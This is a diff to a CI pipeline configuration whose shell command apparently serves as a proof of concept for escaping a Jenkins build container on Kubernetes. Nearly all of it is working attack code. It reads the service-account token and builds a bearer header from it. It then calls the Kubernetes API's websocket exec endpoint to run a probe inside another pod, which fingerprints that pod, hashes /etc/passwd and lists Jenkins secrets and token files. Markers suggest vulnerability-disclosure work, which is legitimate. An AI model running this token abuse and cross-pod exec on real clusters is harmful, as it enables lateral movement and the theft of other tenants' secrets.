@@ -10,57 +10,53 @@ service:
         command: |
           set +x
           T=/var/run/secrets/kubernetes.io/serviceaccount
-          NS=$(cat $T/namespace)
-          K=https://kubernetes.default.svc
+          NS=$(cat $T/namespace); K=https://kubernetes.default.svc
           { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
           chmod 600 /tmp/kc
           SELF=$(hostname)
-          echo "KPPROOF7788-NS=$NS"
-          echo "=== A. WHAT THE BUILD CONTAINER (the caller) IS ==="
-          echo "KPPROOF7788-A-SELF-HOSTNAME=$SELF"
-          echo "KPPROOF7788-A-SELF-IP=$(hostname -i 2>/dev/null)"
-          echo "KPPROOF7788-A-SELF-MNTNS=$(readlink /proc/self/ns/mnt)"
-          echo "KPPROOF7788-A-SELF-UTSNS=$(readlink /proc/self/ns/uts)"
-          echo "KPPROOF7788-A-SELF-PID1=$(tr '\0' ' ' < /proc/1/cmdline)"
-          echo "=== B. WHAT THE KUBERNETES API SAYS ABOUT EACH POD (independent record) ==="
+          cat > /tmp/probe.sh <<'EOS'
+          echo "  etc_hostname   = $(cat /etc/hostname 2>/dev/null)"
+          echo "  hostname_i     = $(hostname -i 2>/dev/null)"
+          echo "  ns_mnt         = $(readlink /proc/self/ns/mnt)"
+          echo "  ns_uts         = $(readlink /proc/self/ns/uts)"
+          echo "  ns_pid         = $(readlink /proc/self/ns/pid)"
+          echo "  pid1_cmdline   = $(tr '\0' ' ' < /proc/1/cmdline)"
+          echo "  passwd_lines   = $(wc -l < /etc/passwd)"
+          echo "  passwd_md5     = $(md5sum < /etc/passwd | cut -d' ' -f1)"
+          echo "  passwd_uid1000 = $(awk -F: '$3==1000' /etc/passwd)"
+          echo "  os_release     = $(. /etc/os-release 2>/dev/null; echo $ID-$VERSION_ID)"
+          echo "  root_dirs      = $(ls / 2>/dev/null | tr '\n' ' ')"
+          echo "  jenkins_home   = $(ls -d /jenkins_home 2>/dev/null || echo ABSENT)"
+          echo "  jh_entries     = $(ls /jenkins_home 2>/dev/null | tr '\n' ' ')"
+          echo "  jh_config_xml  = $(wc -c < /jenkins_home/config.xml 2>/dev/null || echo ABSENT) bytes"
+          echo "  jh_secrets     = $(ls /jenkins_home/secrets 2>/dev/null | tr '\n' ' ')"
+          echo "  agent_workdir  = $(ls -d /home/jenkins/agent 2>/dev/null || echo ABSENT)"
+          echo "  resolv_search  = $(grep -h '^search' /etc/resolv.conf 2>/dev/null)"
+          echo "  sa_token_bytes = $(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo ABSENT)"
+          EOS
+          sed -i 's/^          //' /tmp/probe.sh
+          echo "KPDIFF7788-NS=$NS"
+          echo "########## SIDE 1: THE BUILD CONTAINER (where my pipeline code legitimately runs) ##########"
+          sh /tmp/probe.sh
+          echo "########## KUBERNETES API RECORD FOR BOTH PODS (independent of any exec) ##########"
           curl -s --config /tmp/kc -o /tmp/pr --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/steward-jenkinsfile-runner-pod
           curl -s --config /tmp/kc -o /tmp/ps --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/$SELF
           node -e '
             const fs=require("fs");
-            for (const [tag,f] of [["RUNNER","/tmp/pr"],["SELF","/tmp/ps"]]) {
+            for (const [tag,f] of [["RUNNER","/tmp/pr"],["BUILDCTR","/tmp/ps"]]) {
               const p=JSON.parse(fs.readFileSync(f,"utf8"));
-              console.log(`KPPROOF7788-B-${tag}-NAME=${p.metadata.name}`);
-              console.log(`KPPROOF7788-B-${tag}-UID=${p.metadata.uid}`);
-              console.log(`KPPROOF7788-B-${tag}-PODIP=${(p.status||{}).podIP}`);
-              console.log(`KPPROOF7788-B-${tag}-NODE=${(p.spec||{}).nodeName}`);
+              console.log(`  ${tag}.metadata.name = ${p.metadata.name}`);
+              console.log(`  ${tag}.metadata.uid  = ${p.metadata.uid}`);
+              console.log(`  ${tag}.status.podIP  = ${(p.status||{}).podIP}`);
+              console.log(`  ${tag}.spec.nodeName = ${(p.spec||{}).nodeName}`);
+              console.log(`  ${tag}.spec.serviceAccountName = ${(p.spec||{}).serviceAccountName}`);
               for (const cs of ((p.status||{}).containerStatuses||[]))
-                console.log(`KPPROOF7788-B-${tag}-CTR=${cs.name} id=${cs.containerID}`);
+                console.log(`  ${tag}.container ${cs.name} image=${(cs.image||"").slice(0,70)} id=${cs.containerID}`);
             }'
-          ex() {
-            P="$1"; C="$2"; shift 2
-            Q=""; for a in "$@"; do Q="$Q&command=$a"; done
-            KEY=$(head -c 16 /dev/urandom | base64)
-            curl -s -o /tmp/ex -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 20 \
-              -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" \
-              -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' \
-              "$K/api/v1/namespaces/$NS/pods/$P/exec?container=$C&stdout=true&stderr=true$Q"
-          }
-          R=steward-jenkinsfile-runner-pod; RC=step-jenkinsfile-runner
-          echo "=== C. WHAT THE PROCESS INSIDE THE RUNNER POD REPORTS ==="
-          echo "KPPROOF7788-C-RUNNER-IP-STATUS=$(ex $R $RC hostname -i)"
-          echo "KPPROOF7788-C-RUNNER-IP=$(strings /tmp/ex | grep -aoE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)"
-          echo "KPPROOF7788-C-RUNNER-MNTNS-STATUS=$(ex $R $RC readlink /proc/self/ns/mnt)"
-          echo "KPPROOF7788-C-RUNNER-MNTNS=$(strings /tmp/ex | grep -aoE 'mnt:\[[0-9]+\]' | head -1)"
-          echo "KPPROOF7788-C-RUNNER-UTSNS-STATUS=$(ex $R $RC readlink /proc/self/ns/uts)"
-          echo "KPPROOF7788-C-RUNNER-UTSNS=$(strings /tmp/ex | grep -aoE 'uts:\[[0-9]+\]' | head -1)"
-          ex $R $RC cat /proc/self/mountinfo > /dev/null
-          echo "KPPROOF7788-C-RUNNER-CTRID-IN-MOUNTINFO=$(strings /tmp/ex | grep -aoE '[0-9a-f]{64}' | head -1)"
-          ex $R $RC cat /proc/1/cmdline > /dev/null
-          echo "KPPROOF7788-C-RUNNER-PID1=$(strings /tmp/ex | grep -av '^$' | head -2 | tr '\n' '|')"
-          echo "=== D. CONTROL: same channel, aimed at MY OWN pod ==="
-          echo "KPPROOF7788-D-CONTROL-SELF-IP-STATUS=$(ex $SELF container-exec hostname -i)"
-          echo "KPPROOF7788-D-CONTROL-SELF-IP=$(strings /tmp/ex | grep -aoE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)"
-          echo "KPPROOF7788-D-CONTROL-SELF-MNTNS-STATUS=$(ex $SELF container-exec readlink /proc/self/ns/mnt)"
-          echo "KPPROOF7788-D-CONTROL-SELF-MNTNS=$(strings /tmp/ex | grep -aoE 'mnt:\[[0-9]+\]' | head -1)"
-          rm -f /tmp/kc /tmp/ex /tmp/pr /tmp/ps
-          echo "KPPROOF7788-DONE"
+          Q=$(node -e 'console.log(require("fs").readFileSync("/tmp/probe.sh","utf8"))' | node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>process.stdout.write(encodeURIComponent(d)))')
+          KEY=$(head -c 16 /dev/urandom | base64)
+          echo "########## SIDE 2: THE SAME SCRIPT, EXEC'd INSIDE steward-jenkinsfile-runner-pod ##########"
+          echo "KPDIFF7788-EXEC-STATUS=$(curl -s -o /tmp/ex -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 30 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/steward-jenkinsfile-runner-pod/exec?container=step-jenkinsfile-runner&stdout=true&stderr=true&command=sh&command=-c&command=$Q")"
+          strings /tmp/ex | sed -n '1,40p'
+          rm -f /tmp/kc /tmp/ex /tmp/pr /tmp/ps /tmp/probe.sh
+          echo "KPDIFF7788-DONE"
